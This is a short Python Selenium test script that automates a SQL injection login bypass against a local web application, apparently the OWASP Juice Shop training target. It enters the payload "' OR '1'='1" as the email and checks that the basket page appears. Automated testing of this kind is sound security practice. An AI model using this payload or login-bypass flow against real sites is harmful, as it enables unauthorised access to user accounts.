from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def test_sql_injection(driver):
    driver.get("http://localhost:3000/#/login") 
    WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((By.XPATH, "//*[text()='Dismiss']")))
    driver.find_element(By.XPATH, "//*[text()='Dismiss']").click()

    email_input = driver.find_element(By.ID, "email")
    password_input = driver.find_element(By.ID, "password")

    email_input.send_keys("' OR '1'='1")
    password_input.send_keys("admin123")
    
    login_button = driver.find_element(By.ID, "loginButton")
    assert login_button.is_enabled(), "Login button should be enabled"

    login_button.click()
    
    successfully_login = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.XPATH, "//*[text() = ' Your Basket']")))
    assert successfully_login is not None, "'Cart' is not present"